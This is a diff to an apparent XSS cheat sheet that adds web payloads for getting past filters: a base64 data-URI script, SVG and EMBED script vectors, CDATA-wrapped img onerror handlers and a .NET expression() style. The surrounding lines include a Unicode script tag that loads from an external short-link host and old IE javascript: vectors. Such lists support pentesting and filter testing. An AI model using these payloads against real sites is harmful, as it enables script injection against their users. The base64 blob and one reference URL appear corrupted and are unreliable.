@@ -53,6 +53,27 @@ URL based exploit - ensure that the payload isn't sent to server:
 
 //Unicode Filter Bypass
 ＜script src=https://tiny.cc/numbers＞＜/script＞
+websec.github.io/unicode-security-guide/character-transformations/
+
+//HTML 5 Bypass
+data:text/html;charset=utf-8;base64,PHNjcmlwD5hbGVydCgiRGF0YSBVUk1zIHJvY2shIik7PC9zY3JpcHQ=
+<EMBED SRC="data:image/svg+xml;base64,[exploit]"></EMBED>
+<EMBED SRC="data:image/svg+xml;base64,[exploit]"></EMBED>
+<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg"><script>alert(42)</script></svg>
+Which is <script>alert("DataURIs rock!");</script>
+http://softwarehixie.ch/utilities/cgi/data/data
+https://html5sec.org/
+
+//CDATA
+<![CDATA[<img src="broken" onerror="alert('XSS')"> ]]>
+<![CDATA[><img src="broken" onerror="alert('XSS')">]]>
+
+
+//.net bypass
+<%tag style="xss:expression(alert(42))">
+
+
+//Try changing mime type for other bypasses
 
 //Only works for IE6 and earlier
 <IMG SRC="javascript:alert('XSS');">
@@ -63,6 +84,7 @@ URL based exploit - ensure that the payload isn't sent to server:
 <IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">
 <IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">
 {% endhighlight %}
+
 
 **Tools:**
 * XSSer 
